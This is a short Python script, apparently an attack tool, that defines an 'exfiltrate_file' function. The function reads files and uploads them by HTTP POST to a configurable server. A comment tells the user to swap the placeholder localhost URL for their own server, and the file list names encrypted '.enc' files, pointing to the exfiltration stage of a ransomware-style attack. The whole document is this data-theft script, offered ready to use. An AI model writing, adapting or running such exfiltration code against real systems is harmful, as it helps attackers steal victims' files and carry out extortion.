import requests

def exfiltrate_file(file_path, server_url):
    with open(file_path, 'rb') as f:
        file_data = f.read()
        response = requests.post(server_url, files={'file': file_data})
        if response.status_code == 200:
            print(f"Successfully sent {file_path}")
        else:
            print(f"Failed to send {file_path}")

if __name__ == "__main__":
    server_url = 'http://localhost:8080/upload'  # Change to your server URL
    encrypted_files = ['file1.txt.enc', 'file2.docx.enc']  # Add your encrypted files here
    for file in encrypted_files:
        exfiltrate_file(file, server_url)